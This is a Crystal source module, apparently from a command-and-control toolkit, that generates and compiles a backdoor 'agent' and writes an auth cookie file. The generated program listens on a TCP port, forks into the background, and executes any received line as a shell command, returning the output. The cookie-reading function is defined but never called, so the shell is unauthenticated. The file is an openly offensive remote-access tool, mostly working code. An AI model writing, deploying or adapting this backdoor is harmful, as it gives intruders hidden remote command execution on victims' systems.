module MtAgentGen

        extend self

        def agent_create(agentname : String,  rhost : String, rport : Int32, cookie_file : String, opts : Array(String)) : (Bool|Nil)

                File.open("#{agentname}.cr", "w") do |fp|
                    fp.puts "require \"socket\""
                    fp.puts "stdout = IO::Memory.new"
                    fp.puts "connfd = TCPServer.new(\"#{rhost}\", #{rport})"
                    fp.puts "def cook"
                    fp.puts "     content = File.open(\"myagent_cookie\") do |file|"
                    fp.puts "          file.gets_to_end"
                    fp.puts "     end"
                    fp.puts "     return content"
                    fp.puts "end"
                    fp.puts "def handle_master(master) : Nil"
                    fp.puts "    loop do"
                    fp.puts "        message = `\#{master.gets.to_s}`"
                    fp.puts "        master.puts(message)"
                    fp.puts "    end"
                    fp.puts "    rescue e"
                    fp.puts "        puts \"master disconnected\""
                    fp.puts "end"
                    fp.puts "proc = Process.fork do"
                    fp.puts "    while master = connfd.accept?"
                    fp.puts "        spawn handle_master(master)"
                    fp.puts "    end"
                    fp.puts "end"	
				end


				cmd_string = "/usr/bin/crystal build  #{Dir.current}/#{agentname}.cr"

				opts.each do |opt|
					if "--static" == opt
						cmd_string += " --static"
					end
				end

                system(cmd_string)
        end


        def create_cookie_file(cookie_file : String, lhost : String)

                token = MtAuth.generate_token(lhost)
                token_enc = MtAuth.generate_cookie(token)

                File.open("#{cookie_file}","w") do |fp|
                        fp.puts token_enc
                end
        end

end
